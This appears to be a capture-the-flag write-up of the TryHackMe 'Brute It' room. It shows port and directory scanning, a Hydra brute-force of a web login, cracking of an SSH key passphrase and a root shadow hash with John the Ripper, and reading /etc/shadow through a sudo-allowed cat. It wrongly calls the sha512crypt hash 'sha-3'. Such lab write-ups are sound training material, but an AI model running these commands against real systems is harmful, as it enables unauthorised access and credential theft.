# Brute It

![Image of john the ripper and hydra side by side](https://i.imgur.com/oMbEPD6.jpg)

[Play](https://tryhackme.com/room/bruteit)

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Info gathered answers the following questions:

#### How many ports are open?
#### What version of SSH is running?
#### What version of Apache is running?
#### Which Linux distribution is running?

### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt,zip' -t 64 -q -u 10.10.106.189
/index.html           (Status: 200) [Size: 10918]
/{hidden_directory}                (Status: 301) [Size: 314] [--> http://10.10.106.189/hidden_directory/]
```

Flags:
- -w: Wordlist
- -x: eXtensions
- -t: Threads
- -q: Quiet
- -u: Url

`index.html` is the default ubuntu homepage for apache service. Nothing special.

#### Search for hidden directories on web server. What is the hidden directory?
This is the directory that is hidden above.

### 1.3. Web Exploration
In the hidden directory we get the login panel. Looking at the source code, we get 2 interesting pieces of information:
- name of username and password fields (uselful) in bruteforcing
- username in a comment XD


![The login page in the hidden directory of the ctf](https://i.imgur.com/1o49So5.png)

### 1.4. Brute-Force
From the source we have the variables: `user` and `pass` for username and password respectively.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.160.189  http-post-form "/{hidden_directory}/:user=^USER^&pass=^PASS^:invalid" -t 32`

Flags:
- -l: for single login
- -P: for a password list
- http-form-post: POST request for a http form
- the syntax for http-form-post is divided into three parts by two ":"s - as "x:y:z"
    - x: path to hidden directory
    - y: user and pass parameter specification
    - z: failure status. Note how "invalid" is a substring present in the failure message.

#### What is the user:password of the admin panel?
Using Hydra, we can find the password.

```
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.98.224 http-post-form "/{hidden_directory}/:user=^USER^&pass=^PASS^:invalid" -t 64 -vv
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-09 02:16:45
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.98.224:80/{hidden_directory}/:user=^USER^&pass=^PASS^:invalid
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.98.224/{hidden_directory}/panel
[VERBOSE] Page redirected to http://10.10.98.224/{hidden_directory}/panel/
[80][http-post-form] host: 10.10.98.224   login: admin   password: {password}
[STATUS] attack finished for 10.10.98.224 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-09 02:17:05
```

## 2. Foothold
Logging in, we get the following.
- the web flag
- RSA private key

Download the rsa key, save it. Change the permissions to `600`, as `chmod 600 id_rsa`.

Trying to login gives us:
```
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa john@10.10.98.224
Enter passphrase for key 'id_rsa':
```

We need a passphrase. For that, we use `ssh2john`.

```
┌──(kali㉿kali)-[/tmp]
└─$ locate ssh2john
/usr/share/john/ssh2john.py
                                                                                                                                 
┌──(kali㉿kali)-[/tmp]
└─$ /usr/share/john/ssh2john.py id_rsa > hash
                                                                                                                                 
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}       (id_rsa)
1g 0:00:00:05 DONE (2021-06-09 02:16) 0.1876g/s 2690Kp/s 2690Kc/s 2690KC/s     1990..*7¡Vamos!
Session completed
```

#### What is John's RSA Private Key passphrase?
Run JtR to bruteforce id_rsa's passphrase

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa john@10.10.98.224
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
```

We are in!

## 3. PrivEsc

```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:~$ sudo /bin/cat /root/root.txt
THM{hidden}
```
And we get the root flag!

How about the password?
```
john@bruteit:/$ cat /etc/shadow
cat: /etc/shadow: Permission denied
john@bruteit:/$ sudo cat /etc/shadow
root:{interesting_info_was_here}
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
...
```

We get the sha-3 hash and then crack using JtR again.

```
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}         (root)
1g 0:00:00:00 DONE (2021-06-09 02:30) 5.882g/s 4517p/s 4517c/s 4517C/s 123456..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

#### What is the root's password?
We can answer this using the above

#### root.txt
ditto

And we are done!
